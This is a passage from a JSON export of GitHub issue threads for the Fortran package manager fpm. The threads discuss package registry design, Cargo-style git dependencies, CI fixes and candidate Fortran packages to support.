                    "text": "@milancurcic yes, if you could please document this and the reasoning behind this decision, that would be awesome. I am really happy you agree with this also. It's different to what I've been used to doing, but only in the fact that each module has the full name in the module line (and when you think about it, it makes sense to do it that way until j3-fortran/fortran_proposals#86 is implemented). Otherwise I've seen lots of projects structured in directories like this."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-27 20:38:49+00:00",
                    "text": "It looks like we're on the same page now. Thanks for struggling through this @milancurcic . I know we didn't do a very good job documenting it, so your efforts are hugely appreciated."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:30:00+00:00",
                    "text": "I think this is pretty well settled now. Should we close this?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 05:25:10+00:00",
                    "text": "We should document these choices and why we chose it. Then we can close this. Because this will come up again.\n\u2026\nOn Wed, Apr 29, 2020, at 9:30 PM, Brad Richardson wrote:\n\n\n I think this is pretty well settled now. Should we close this?\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#39 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWES7J5OW4SJVYLBDYLRPDWENANCNFSM4K2TQKOQ>."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 06:41:18+00:00",
                    "text": "This issue does not have much info anyway and it is documented in the tutorial a bit, so let's close this one."
                }
            ]
        },
        {
            "number": 38,
            "user": "certik",
            "date": "2020-02-23 18:31:31+00:00",
            "title": "Implement common_prefix",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-23 18:40:48+00:00",
                    "text": "There is a failure on Windows due to / vs \\. I am glad we test it. I have to investigate and fix it."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 06:53:58+00:00",
                    "text": "I am going to close this one for now."
                }
            ]
        },
        {
            "number": 37,
            "user": "certik",
            "date": "2020-02-20 21:37:08+00:00",
            "title": "CI: Do not install GFortran (already present)",
            "text": "Implemented in actions/virtual-environments#202 (comment).",
            "comments": []
        },
        {
            "number": 36,
            "user": "certik",
            "date": "2020-01-31 19:59:25+00:00",
            "title": "How to handle packages that do not have `fpm.toml`",
            "text": "There will be a lot of packages that do not have fpm.toml. Here is my suggested approach how to handle that:\n\n\nEncourage every package to use fpm.toml and to use fpm.\n\n\nThose packages that do not use it yet could be handled as follows: we will maintain a version (fork) at GitHub or GitLab that includes the fpm.toml. It will be this fork that would be used with fpm. From fpm's perspective, each package always contains fpm.toml.\n\n\nThe alternative to (or modification of) 2. is to allow fpm.toml to specify where to find sources of the actual package. So our GitLab package can be just one file fpm.toml that would list the metadata and where to download the sources plus any patches to them.\n\n\nIn particular, here is my plan: I will start with forking the packages listed at #17 and implementing fpm.toml together with any modifications that might be needed. I will not submit a PR back initially, but rather simply get my forks working well with fpm, and test it all out and get some usage. Then, as things start to get more serious and the fpm tool matures, we can easily send a PR against the upstream package and start the discussion with upstream authors if they would be willing to use fpm and maintain fpm.toml themselves. And depending on how this conversation goes, we'll either do just 2., or if we need to, we can also implement 3. in fpm. I expect that upstream authors will give us a list of features that they need fpm to have implemented, and once we do, they would be willing to use it.",
            "comments": []
        },
        {
            "number": 35,
            "user": "certik",
            "date": "2020-01-31 19:25:52+00:00",
            "title": "Full package registry",
            "text": "After #34 is implemented, we can discuss how to implement a full package registry similar to https://crates.io. It would be an extension of #34, which would also include hosting of the tarballs, and collecting usage statistics and other things. I think the solution in #34 can be evolved into this.",
            "comments": []
        },
        {
            "number": 34,
            "user": "certik",
            "date": "2020-01-31 19:22:34+00:00",
            "title": "Minimal metadata registry",
            "text": "After #33 is implemented, the next step is to implement a minimal metadata registry. Here is one way to do that:\n\nHave repository https://github.com/fortran-lang/package-registry that would contain a simple JSON file of this form which is the package registry:\n\n[{\n    \"name\": \"stdlib\",\n    \"versions\": [\n        {\"version\": \"0.3.4\", \"url\": \"https://github.com/fortran-lang/stdlib/archive/0.3.4.tar.gz\"},\n        {\"version\": \"0.3.5\", \"url\": \"https://github.com/fortran-lang/stdlib/archive/0.3.5.tar.gz\"},\n    ]\n}, {\n    \"name\": \"bspline\",\n    \"versions\": [\n        {\"version\": \"6.0.0\", \"url\": \"https://github.com/jacobwilliams/bspline-fortran/archive/6.0.0.tar.gz\"},\n        {\"version\": \"5.4.2\", \"url\": \"https://github.com/jacobwilliams/bspline-fortran/archive/5.4.2.tar.gz\"},\n    ]\n}]\n\n\nWe will then have scripts that take this JSON file and download the actual metadata for each package version. So for example, to obtain the metadata for the package bspline version 5.4.2, it would download the tarball https://github.com/jacobwilliams/bspline-fortran/archive/5.4.2.tar.gz, unpack and it would read its fpm.toml, which would contain all the metadata such as short and long description, the list of dependencies, and other things. Then we can automatically create a website which would list all this metadata. This generated website would contain a generated file metadata.json, which the fpm tool can then download to obtain a searchable data base of packages (fpm search).\n\n\nTo add a new package to registry, just a new simple entry must be made to the above JSON file by hand, say by issuing a PR against the repository.\n\n\nLater we can automate things more, similarly to how conda-forge works (https://conda-forge.org/docs/maintainer/adding_pkgs.html), where to put a new package in, a PR is sent against https://github.com/conda-forge/staged-recipes/, where the CI checks initial quality and that the package builds, and then if it gets merged, the CI actually creates a new repository for the package etc. In our case, we could have a staging repository, and if a PR is merged, the CI would correctly update the above JSON file.\n\n\nWe can discuss if the JSON file should also contain all the metadata from fpm.toml directly. The advantage of the above approach is that it is not redundant, the JSON only contains the minimal amount of information that can be edited and maintained by hand, and if you want more, you download the tarball and read its fpm.toml, which will be done automatically in the step 2.\nOverall, this minimal package registry only contains a minimal JSON file. The actual tarballs and metadata are hosted elsewhere. After this is well implemented and works, we can evolve it into a full package registry (#35).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-31 19:35:29+00:00",
                    "text": "The thing to discuss here, which we didn't have to worry about in #33 is what to do if multiple people want to have a bspline package. Should we require to prefix it with the github organization/user name, as in jacobwilliams/bspline, or what do we do if somebody submits (registers) the bspline name, but there will later be a better, more widely used and popular bspline package. If we simply switch the url for bspline from the old package to the new package, then all kinds of packages that already depend on the old bspline package would break. One approach could be that since most Fortran packages will be in this ecosystem, we would know which packages depend on it, so we could correctly update them all (and rename bspline to bspline_legacy). For example Debian had to rename the git package, as it wasn't the usual git, but some older package that just happened to be called git before the version control system came along. In our case I can see this happening for every popular package name such as \"mesh\", \"utils\", \"spline\", ... So we should have some policy how to handle such things. One such policy can be that we would evaluate the usage and a number of github stars, and allow the most used package to have the more popular name."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-31 19:49:28+00:00",
                    "text": "Great, thanks! The step 2 in the proposed flow assumes that the package will include its fpm.toml. However, this is only possible if the package has an active maintainer that is willing to maintain the package-specific fpm.toml. Would this not preclude fpm from downloading tarballed packages from the wild, like SOFA for example?\nIf the community maintains all metadata needed to download and build the package in the registry, it would broaden the ecosystem of packages fpm could work with."
                },
                {
                    "user": "certik",
                    "date": "2020-01-31 20:00:58+00:00",
                    "text": "@milancurcic your last comment seems to be a bit orthogonal issue, so I created #36 for it to discuss just this aspect of how fpm is designed."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-10 18:52:48+00:00",
                    "text": "Now that there's a package that can be built with fpm, let's revisit this issue which is a requirement for installing a package from a remote location such as a GitHub repo.\nI think @certik's idea of a minimal registry is a good start. We'll also need a description field, so that fpm list not just names of packages, but also there (one-line) descriptions, just like other package managers.\nAnother doubt I have is whether this should be a separate repository, rather than part of this repository. In my opinion, keeping it in this repo is simpler because:\n\nOne doesn't need to maintain a separate repo for the registry\nLess confusing for newcomers--there's only one repo (this one), whether you want to contribute to the code, or submit a package to the registry\nIssues+PR system allows clean separation between fpm issues and package submissions to the registry. So we don't need to separate them in another way.\n\nfpm would need to update its registry cache in either approach.\n@certik are there benefits of having a registry in a separate repo, or is it more an esthetic thing?\n\nSeparate vs. same repo question aside, how would this look like from the UI perspective? For simplicity, let's forget about search for now. Let's say we just want to be able to list available packages. This could be something like:\nfpm list\n  datetime-1.7.0 -- Date and time manipulation\n  openblas-0.3.9 -- Optimized BLAS library based on GotoBLAS2\n  stdlib-0.1.0 -- Fortran standard library\n\nUnder the hood, fpm:\n\nFetches the registry\nParses it\nLists individual packages and latest version so you get the above\n\nWe can discuss how to list individual available versions at a later time. Let's try to solve the minimal problem first."
                },
                {
                    "user": "certik",
                    "date": "2020-05-10 19:13:31+00:00",
                    "text": "My initial gut feeling is not to put packages in this repository. Although Spack does it like that and I think it works for them.\n\nEither way, fpm needs to download the packages from the internet, unless we do it like Spack, which reads them from a local repository checkout.\n\nI think since we are in a prototype mode, let's just put everything in this repo. Get things working for a few packages with dependencies and then let's figure out what to do for production version of fpm.\n\nLet's also understand well how Cargo does it and why something does not work for us. Let's also document our reasoning.\n\u2026\nOn Sun, May 10, 2020, at 12:53 PM, Milan Curcic wrote:\n\n\n Now that there's a package that can be built with fpm\n <https://github.com/wavebitscientific/datetime-fortran>, let's revisit\n this issue which is a requirement for installing a package from a\n remote location such as a GitHub repo.\n\n I think @certik <https://github.com/certik>'s idea of a minimal\n registry is a good start. We'll also need a description field, so that\n fpm list not just names of packages, but also there (one-line)\n descriptions, just like other package managers.\n\n Another doubt I have is whether this should be a separate repository,\n rather than part of this repository. In my opinion, keeping it in this\n repo is simpler because:\n\n  * One doesn't need to maintain a separate repo for the registry\n  * Less confusing for newcomers--there's only one repo (this one),\n whether you want to contribute to the code, or submit a package to the\n registry\n  * Issues+PR system allows clean separation between fpm issues and\n package submissions to the registry. So we don't need to separate them\n in another way.\n fpm would need to update its registry cache in either approach.\n\n @certik <https://github.com/certik> are there benefits of having a\n registry in a separate repo, or is it more an esthetic thing?\n\n Separate vs. same repo question aside, how would this look like from\n the UI perspective? For simplicity, let's forget about search for now.\n Let's say we just want to be able to list available packages. This\n could be something like:\n\n `fpm list\n   datetime-1.7.0 -- Date and time manipulation\n   openblas-0.3.9 -- Optimized BLAS library based on GotoBLAS2\n   stdlib-0.1.0 -- Fortran standard library\n `\n Under the hood, fpm:\n\n  1. Fetches the registry\n  2. Parses it\n  3. Lists individual packages and latest version so you get the above\n We can discuss how to list individual available versions at a later\n time. Let's try to solve the minimal problem first.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#34 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGTEEJIDXEN5FKTROTRQ3ZYZANCNFSM4KOMKF7A>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 02:33:50+00:00",
                    "text": "I think we should do what Cargo does with crates.io and have a separate repository for packages. Packages are stored there as tarballs and you can interact with it via a simple REST API. This gives us several advantages.\n\nWe can put certain checks in place for packages published to the official repo\nAnyone else can stand up their own repo, and just conform to the same API (i.e. private repos). We can even open-source the code for it\nAnyone else can write whatever tools they like to interact with it\n\nUntil we can get such a service stood up, we should endeavor to keep a list in the fpm README of known packages"
                },
                {
                    "user": "certik",
                    "date": "2020-05-11 13:31:39+00:00",
                    "text": "@everythingfunctional what you are proposing is #35. I think we all agree on that one. We also agree that is a lot of work, and so right now we are discussing what to do until we get there.\nSo far the proposals are:\n\nDocument available packages in the README\nCreate a manual metadata registry (this issue #34)\n\nI think we should definitely try the manual metadata registry, not just a README, as it would allow us to almost get the full experience of #35.\n\nProgressing the discussion further, I proposed above how such a JSON file (if we use JSON) could look like. Milan suggested it also needs a description field. I don't think that's a good idea for the following reasons:\n\nThe description is another thing to handle manually\nIt can change between versions, so it would have to be attached to each version\nIt's duplicate from the upstream package's toml file, another thing to keep in sync.\n\nThe reason I think why Milan proposed it is to make it possible for fpm to print packages with more information about them. I agree fpm should be able to do that, but not in the above proposed way.\nThe same with putting this metadata in this repository.\nRather, we should plan out how to we get to fixing #35. And then in this issue we should do work that is aligned with it.\nSo here I am proposing a draft of such a plan:\n\nThe issue #35 is mainly about hosting tarballs. But everything else about the registry can be done as part of this issue\nHave a separate repository called fpm_registry\nThe fpm_registry will have a JSON file (with the format above)\nTo submit a package (version) to the registry, people send a PR towards fpm_registry to update the JSON file ---- and just like when submitting to pypi or crates, you do not fill out a separate description field, you should not here either --- that gets filled out automatically from fpm.toml (see below)\nThen we have a separate repository plus CI pipeline that automatically takes this JSON file and:\n\ndownloads each package (it can cache old info, so only needs to download new packages), extracts full metadata (description, dependencies, etc.) and uses that information to:\ncreate a nice website with a page for each package that looks like crates.io (has a description, links to dependencies, and any other useful metadata extracted from fpm.toml)\ncreate a \"registry JSON\", which has full metadata for each package, including description\n\n\nfpm gets updated to be able to download this \"registry JSON\" from this auto generated website, and use this \"registry JSON\" to print info about packages, what packages depend on, etc.\n\nThen later on, to take this to implement the full #35, the only thing missing really is just hosting of tarballs. Everything else I think can be reused.\nThe above plan also allows other people (companies) to host their own registry\n\nThe above plan can be started by simply:\n\ncreate an fpm_registry with the minimal JSON\nadd a CI that takes this JSON and creates \"registry JSON\" and hosts it online\nupdate fpm to download and work with this \"registry JSON\"\n\nThese are three simple steps that I can even help implement, I've done something similar for LFortran. This can then be naturally expanded to also create a nice website."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 14:20:14+00:00",
                    "text": "I like that plan. It's usable to the point that even if we don't end up moving to a tarball hosting registry, I don't think anybody would even mind."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-11 15:44:57+00:00",
                    "text": "I like this plan as well. So actually this minimal registry is not what's read by fpm, but is read by another program that outputs the \"production\" registry with complete information. This is a good idea because then we don't have to assume ahead of time what is all the metadata that we'll need.\nI realize now that this issue is a step 2 from a 3-step #33. I will write there for now."
                },
                {
                    "user": "certik",
                    "date": "2020-07-20 20:36:37+00:00",
                    "text": "Now when #33 is (mostly) done, let's tackle this issue.\n@milancurcic, @everythingfunctional, let's keep the (centralized) registry in a separate repository. How should it be named? Some ideas:\nhttps://github.com/fortran-lang/package-registry\nhttps://github.com/fortran-lang/fpm-package-registry\nhttps://github.com/fortran-lang/fpm-registry\nI don't really have a preference. This repository will have a JSON or rather a TOML file where people will submit their packages using a GitHub PR. This file will only contain the name of the package, the version and url (everything else is redundant, so should not be there). There can also be the \"latest\"/\"development\" version that would simply download the latest git (and thus things like description can change in this latest version, so that should not be part of this TOML file, but rather only in the upstream repository inside fpm.toml, and we process it automatically).\nWe'll then build CI jobs to process this JSON/TOML file to:\n\ncreate rich metadata JSON file that collects things like descriptions, license, website, logo url (later on), etc. by downloading the package (ensuring it actually downloads...) and reading the fpm.toml inside it.\nadd a section to our fortran-lang.org website (ccing @LKedward) that would probably use the json metadata from the previous point\nimplement fpm search that would use the json metadata from the first bullet point to implement search (so that you can search through the description of the package, not just the name)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-20 22:46:58+00:00",
                    "text": "Looks good. I like fpm-registry.\nI'm unclear about versions. If this file includes the version number, which version is it? The latest? Perhaps all versions that are fpm-enabled? Or should the version metadata be the responsibility of the package itself?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-20 22:50:22+00:00",
                    "text": "Re version: all versions that are fpm enabled. This is hard to figure out automatically, as typically old versions are just some git tags, and maybe not all of them are valid / working, etc. So I figured each version has to be explicitly specified, and one of the version can be \"latest git commit\"."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-20 23:03:15+00:00",
                    "text": "I like fpm-registry.\nI worry a bit about having to specify every version. But as this is more of a stop-gap measure, I guess it's ok."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 23:07:59+00:00",
                    "text": "Ok, I created https://github.com/fortran-lang/fpm-registry and gave access to everybody with push access. We can start submitting PRs against that repository to get it up."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 23:21:17+00:00",
                    "text": "We can continue the discussion at fortran-lang/fpm-registry#1 and other issues there."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:23:00+00:00",
                    "text": "Closing as this has been implemented at https://github.com/fortran-lang/fpm-registry/, further discussion can continue there."
                }
            ]
        },
        {
            "number": 33,
            "user": "certik",
            "date": "2020-01-31 04:18:26+00:00",
            "title": "Decentralized package management",
            "text": "Rust allows the packages to be decentralized, they do not have to be listed at https://crates.io/.\nThe Go language does not even have a centralized package registry at all, see this blog post that explains it in the section \"Package Management\":\nhttps://nullprogram.com/blog/2020/01/21/\n\nModules are named by a module path that includes its network location. This means there\u2019s no land grab for popular module names.\n\nI don't like the Go's model that the name of the package is the url, I prefer the Rust model where a package has a simple name, but you specify where it can be downloaded. The end result is the same. (Overall, the Rust package management seems much more thought out, and it seems they fixed the issues that Go is tackling long time ago.)\nI want to implement the same approach for fpm. That will allow us to build an ecosystem of packages for Fortran, without a \"goldrush\" to reserve a popular package name in a centralized registry. Then, as we have a healthy ecosystem of packages, we can add a centralized registry later.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-31 18:45:30+00:00",
                    "text": "Overall I like this direction. However I'm confused about how this works in practice. Perhaps it's just a terminology issue.\nLike PyPI, Crates serves both as a registry (metadata), and code distribution.\nI agree that it's not feasible for fpm to host and distribute code. It's a huge ordeal and technical challenge.\nHowever, do you also mean that fpm wouldn't have a centralized metadata registry? If yes, how would a newcomer to Fortran and fpm search for packages? It seems to me that if you don't have some centralized metadata registry, the user would need to know what package they need and how to download it."
                },
                {
                    "user": "certik",
                    "date": "2020-01-31 19:44:11+00:00",
                    "text": "I think it's a step by step process, we start with the step 1. below, then we progress to step 2. and then to step 3.:\n\n\nThis issue #33: indeed there is no centralized metadata registry. The advantage is that there is no \"goldrush\" to reserve popular names in a centralized registry. Initially there is no package search (newcomers must know the package name), but I can imagine actually creating a search --- all we need for people to submit urls of packages out there, and since each is using fpm.toml, we can then create a search of those decentralized packages.\n\n\nIssue #34: minimal centralized registry. Allows a natural fpm search capability.\n\n\nIssue #35: both registry and code distribution.\n\n\nIf step 1. is fully developed, there can actually be a \"decentralized package registry\". It would work just like described in step 2. (see the issue #34 for details), except that there would not be a centralized name for a package, so people could submit various packages (as url) that can have the same name. Then fpm search would give you all the packages with urls to put into your fpm.toml. We can curate this list as a community to prevent spam and malicious code."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-11 15:51:08+00:00",
                    "text": "Coming from #34, let's discuss how the step 1 (no centralized registry) works. This means we don't need fpm search and fpm list.\nLet's say I just want to fpm install with datetime-fortran as a dependency. I know the name of the package. I don't (and shouldn't) know the URL of the package.\n@certik How does this work? It seems to me that we need some metadata even at this stage.\nOr is the user expected to enter something like:\n[dependencies]\nname = \"datetime\"\nurl = \"https://github.com/wavebitscientific/datetime-fortran\"\nto their fpm.toml?\nBoth approaches seem okay to me for now (latter is simpler), I'm just not clear what's your idea how this works."
                },
                {
                    "user": "certik",
                    "date": "2020-05-11 16:11:38+00:00",
                    "text": "The step 2 in #34 is what we should eventually do, and then step 3 in #35. It looks like we got agreement on both.\nYou can only install datetime-fortran (btw, it should probably just be called datetime) without knowing the url at the step 2., because you need the registry to get the url.\nSo let's start with step 1 in this issue #33. In here I propose to do exactly what Cargo does. Say I want to use datetime in my program. Here are details about Cargo's syntax: https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html, so let's do what they do:\nI would have this in my fpm.toml:\n[dependencies]\ndatetime = \"1.7.0\"\nOnce step 2 is implemented, then fpm would have a default registry, and you can also specify your own registry either on a command line or explicitly:\n[dependencies]\ndatetime = { version = \"1.7.0\", registry = \"my-registry\" }\nUntil then, in this step 1, we do not have a registry, so you have to also tell it where it can download the datetime package directly. As explained at the webpage, Cargo only uses the version field if it downloads from a registry, otherwise it ignores it if it downloads it directly from a git repository or a local path. We can start with that approach, if we need more, we can modify that behavior. So here is how you would do it:\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\", tag = \"v1.7.0\" }\nHowever, since we want to move to a registry, and since most projects follow the convention of prefixing the version by v in the git tag (I do in all my projects, and I noticed you do too), I am proposing this natural extension of what Cargo does:\n\nIf git and version is specified, it will checkout a tag named v + version from that git repository\n\nSo with this extension, you would do:\n[dependencies]\ndatetime = { version = \"1.7.0\", git = \"https://github.com/wavebitscientific/datetime-fortran\" }\nAnd then later once we move to a registry, you just remove the git field, but keep the version and it would do the right thing."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 16:27:04+00:00",
                    "text": "Cargo actually has a different meaning for this:\n[dependencies]\ndatetime = { version = \"1.7.0\", git = \"https://github.com/wavebitscientific/datetime-fortran\" }\nThis means that when working in this package, it will download the latest master version of datetime, but for a package that depends on this one, the transitive dependency is version 1.7.0 of datetime from the default registry.\nI'm not saying we definitely shouldn't do what you're suggesting, but if we do it will preclude us from ending up with the same functionality as Cargo. It would also impose a tagging convention on people's repositories that will be unnecessary once we have a proper registry. Also, relying on git tags for official release version identifiers is wide open for abuse."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-11 16:51:00+00:00",
                    "text": "Perfect, this is what we're after as a first step:\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\", tag = \"v1.7.0\" }\nThis alone will already be a huge improvement over the current state of things.\nWe can work out the nuances of version and registry behavior as we go."
                },
                {
                    "user": "certik",
                    "date": "2020-05-11 16:53:16+00:00",
                    "text": "@everythingfunctional I am glad you noticed that. Let's not do my proposal then, just use tag. I think it is good enough and we will have a minimal registry soon anyway."
                },
                {
                    "user": "certik",
                    "date": "2020-07-20 20:25:03+00:00",
                    "text": "@everythingfunctional, @milancurcic I think this issue is fixed now?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-20 20:36:40+00:00",
                    "text": "Yes, IMO this is good to close."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-20 23:06:28+00:00",
                    "text": "Yep, go ahead and close it."
                }
            ]
        },
        {
            "number": 32,
            "user": "certik",
            "date": "2020-01-28 06:37:38+00:00",
            "title": "Implement dependencies",
            "text": "Just like in Cargo.\nWe should work on this after #25 is fixed.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:40:01+00:00",
                    "text": "This seems to be related to the removed Rust version."
                }
            ]
        },
        {
            "number": 31,
            "user": "certik",
            "date": "2020-01-28 06:34:52+00:00",
            "title": "Add tests for different build directories",
            "text": "We need to add more tests:\n\n test that the default directory is target (in some temporary directory)\n test other locations of the build directory (will require to construct relative paths in CMakeLists.txt)",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:39:44+00:00",
                    "text": "This seems to be related to the removed Rust version."
                }
            ]
        },
        {
            "number": 30,
            "user": "certik",
            "date": "2020-01-28 05:54:47+00:00",
            "title": "Cleanup the test program",
            "text": "",
            "comments": []
        },
        {
            "number": 29,
            "user": "certik",
            "date": "2020-01-28 01:55:16+00:00",
            "title": "Use Command::new() instead of Command::cargo_new()",
            "text": "This seems to actually fix the issue #16 as documented at:\nhttps://users.rust-lang.org/t/github-actions-randomly-kill-a-test-program/37255/6",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-28 02:02:34+00:00",
                    "text": "I need to figure out how to obtain the absolute path to fpm in a platform independent way, and then pass it in. But this approach seems to be able to fix it."
                },
                {
                    "user": "certik",
                    "date": "2020-01-28 04:59:06+00:00",
                    "text": "Tests pass. I am now testing that this truly fixes the macOS bug at certik#14."
                },
                {
                    "user": "certik",
                    "date": "2020-01-28 05:34:37+00:00",
                    "text": "It works. I think this really fixed it! I am going to merge this and we'll watch it if it ever fails again."
                }
            ]
        },
        {
            "number": 28,
            "user": "certik",
            "date": "2020-01-25 17:44:14+00:00",
            "title": "Add Cargo.lock",
            "text": "This is the recommended approach for an application.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-25 18:29:18+00:00",
                    "text": "I was surprised by this, but indeed the docs recommend not committing Cargo.lock for a library and committing it for an application. Link for anybody like me who wondered about this:\nhttps://doc.rust-lang.org/cargo/faq.html#why-do-binaries-have-cargolock-in-version-control-but-not-libraries"
                }
            ]
        },
        {
            "number": 27,
            "user": "certik",
            "date": "2020-01-25 17:34:00+00:00",
            "title": "Install cmake using apt-get",
            "text": "",
            "comments": []
        },
        {
            "number": 26,
            "user": "certik",
            "date": "2020-01-18 17:31:51+00:00",
            "title": "Build in a target directory",
            "text": "Fixes #24.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-18 18:01:01+00:00",
                    "text": "I just need to fix it up on macOS and Windows."
                }
            ]
        },
        {
            "number": 25,
            "user": "certik",
            "date": "2020-01-18 15:05:48+00:00",
            "title": "Build in temporary directory for tests",
            "text": "After #24 and #31 is fixed, set the --target-dir to a temporary directory for tests. That way multiple tests can reuse the same source directory for different tests, in parallel.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:45:19+00:00",
                    "text": "This seems to be related to the removed Rust version."
                }
            ]
        },
        {
            "number": 24,
            "user": "certik",
            "date": "2020-01-18 15:05:05+00:00",
            "title": "Put everything into target/",
            "text": "Put the CMakeLists.txt into target/, and ensure the source directory is not polluted at all.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-28 06:35:12+00:00",
                    "text": "The basic issue is fixed, but more tests need to be added (#31)."
                }
            ]
        },
        {
            "number": 23,
            "user": "certik",
            "date": "2020-01-18 15:00:29+00:00",
            "title": "Implement --target-dir",
            "text": "",
            "comments": []
        },
        {
            "number": 22,
            "user": "certik",
            "date": "2020-01-18 06:39:01+00:00",
            "title": "Parse fpm.toml",
            "text": "",
            "comments": []
        },
        {
            "number": 21,
            "user": "certik",
            "date": "2020-01-18 00:02:55+00:00",
            "title": "Print the full Rust stacktrace on error",
            "text": "",
            "comments": []
        },
        {
            "number": 20,
            "user": "certik",
            "date": "2020-01-17 23:36:35+00:00",
            "title": "macOS: repeat the test up to 2x if it fails",
            "text": "This is a workaround for #16. It turns out that if the executable fails\nto run, just rerunning all tests typically fixes it.",
            "comments": []
        },
        {
            "number": 19,
            "user": "certik",
            "date": "2020-01-17 20:30:08+00:00",
            "title": "CI repr 6",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-17 20:54:20+00:00",
                    "text": "My apologies, meant to create this one: certik#5"
                }
            ]
        },
        {
            "number": 18,
            "user": "certik",
            "date": "2020-01-16 05:56:24+00:00",
            "title": "Better reporting on terminated processes",
            "text": "This will eventually help fix #16.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-16 06:45:48+00:00",
                    "text": "I think this PR works as expected. In https://github.com/fortran-lang/fpm/pull/18/checks?check_run_id=392603247 it reports more information about the failure due to #16:\nrunning 3 tests\ntest test_help ... ok\ntest test_2 ... FAILED\ntest test_1 ... ok\n\nfailures:\n\n---- test_2 stdout ----\nstatus: signal: 9\nstdout: \nstderr: \n##[error]thread 'test_2' panicked at 'INTERRUPTED with signal: 9', tests/cli.rs:35:21"
                }
            ]
        },
        {
            "number": 17,
            "user": "certik",
            "date": "2020-01-15 22:18:24+00:00",
            "title": "Candidate packages to get working",
            "text": "Here are a few good candidate packages to get working with fpm first, that are relatively simple (and so possible to package soon), yet very useful.\nPure Fortran (Simple)\n\n https://github.com/wavebitscientific/functional-fortran\n https://github.com/jacobwilliams/bspline-fortran\n https://github.com/fortran-lang/stdlib\n https://github.com/astrofrog/fortranlib\n https://github.com/certik/fortran-utils/\n https://github.com/wavebitscientific/datetime-fortran\n https://github.com/jacobwilliams/pyplot-fortran\n\nPure Fortran (More Complex)\n\n https://github.com/Reference-LAPACK/lapack\n https://github.com/opencollab/arpack-ng\n https://github.com/jacobwilliams/json-fortran\n https://github.com/jacobwilliams/Fortran-Astrodynamics-Toolkit\n https://github.com/Goddard-Fortran-Ecosystem/pFUnit\n https://github.com/szaghi/StringiFor (Lots of dependencies)\n\nFortran with non-Fortran dependencies\n\n https://github.com/scivision/h5fortran\n https://github.com/scivision/nc4fortran\n https://github.com/SHTOOLS/SHTOOLS\n https://github.com/unidata/netcdf-fortran\n\nAnd obviously any other more complicated package from https://github.com/fortran-lang/stdlib/wiki/List-of-popular-open-source-Fortran-projects.\nAny other candidates?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-16 03:02:29+00:00",
                    "text": "I added nc4fortran and netcdf-fortran to the list."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-17 21:33:09+00:00",
                    "text": "I recall reading a comment once (might have been from @jacobwilliams) that \"Netlib is where Fortran codes go to die\".\nWell I just resurrected the y12m package for sparse linear systems published all the way back in 1981!\nIn the documentation the library claims to use only standard Fortran features (at the time), and indeed - it builds with both gfortran (warnings about deprecated syntax) and Intel Fortran (no errors) straight out of the box! I thinks it's a great showcase of the strength of Fortran and also fpm.  \ud83d\udc4d\nOne of the authors - Zahari Zlatev - is an established scientist in environmental modelling and sparse linear algebra. I presume the code was used in the Unified Danish Eulerian Model - an atmospheric model used to study transport of air pollutants.\nSeveral more netlib packages are interesting candidates: http://www.netlib.org/liblist.html\nSomeone teaching a Fortran programming class (@awvwgk) chould give this as a homework assignment: each student who wants to pass should create the manifest and interface module for one Netlib package. The  Intel Fortran compiler already knows how to automatically generate interface blocks. Then it is just a matter of aggregating them in a single interface module.\nMaybe the maintainers of Netlib from University of Tennessee and Oak Ridge National Laboratory would also be willing to support such a modernization effort."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-19 07:43:15+00:00",
                    "text": "LINPACK now also works with fpm, even if superceded by LAPACK for modern usage.\nSome of the available Netlib packages (still) depend on LINPACK, so an fpm package is the best way to fulfill these dependencies.\nI think I might create a table to track which Netlib codes are already fpm-compatible. What do you think?"
                },
                {
                    "user": "certik",
                    "date": "2021-02-19 16:28:59+00:00",
                    "text": "@ivan-pi yes!\nWe should setup some automatic tests to ensure things keep working when we upgrade fpm, such as after treating .f as free form, which would require to add a flag to fpm.toml.\nThis is exciting, I might actually start using some of these Fortran packages!"
                },
                {
                    "user": "awvwgk",
